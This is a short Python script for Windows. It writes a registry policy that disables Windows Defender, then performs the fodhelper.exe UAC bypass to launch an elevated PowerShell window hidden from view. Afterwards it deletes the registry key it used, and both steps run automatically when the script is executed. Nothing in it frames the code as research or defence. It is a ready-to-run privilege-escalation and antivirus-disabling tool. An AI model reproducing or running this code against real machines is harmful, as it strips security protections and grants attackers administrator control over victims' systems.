import subprocess
import time
import winreg
import os

#defender bypass
def disable_windows_defender():
    key_path = r"SOFTWARE\Policies\Microsoft\Windows Defender"
    with winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path) as key:
        winreg.SetValueEx(key, "DisableAntiSpyware", 0, winreg.REG_DWORD, 1)

#uac bypass
def fodhelper_bypass(program="cmd /c start powershell.exe"):
    # Create registry structure
    key_path = r"Software\Classes\ms-settings\Shell\Open\command"
    try:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
        winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
        winreg.SetValueEx(key, "", 0, winreg.REG_SZ, program)
    except Exception as e:
        print("Error creating registry structure:", e)
        return

    # Perform the bypass
    try:
        subprocess.Popen(["C:\\Windows\\System32\\fodhelper.exe"], creationflags=subprocess.CREATE_NO_WINDOW)
    except Exception as e:
        print("Error starting fodhelper.exe:", e)
        return

    # Remove registry structure
    time.sleep(3)
    try:
        winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r"Software\Classes\ms-settings\Shell\Open\command")
    except FileNotFoundError:
        pass  # Registry structure already removed or not found
    except Exception as e:
        print("Error removing registry structure:", e)

# Call the function with default parameters
disable_windows_defender()
fodhelper_bypass()
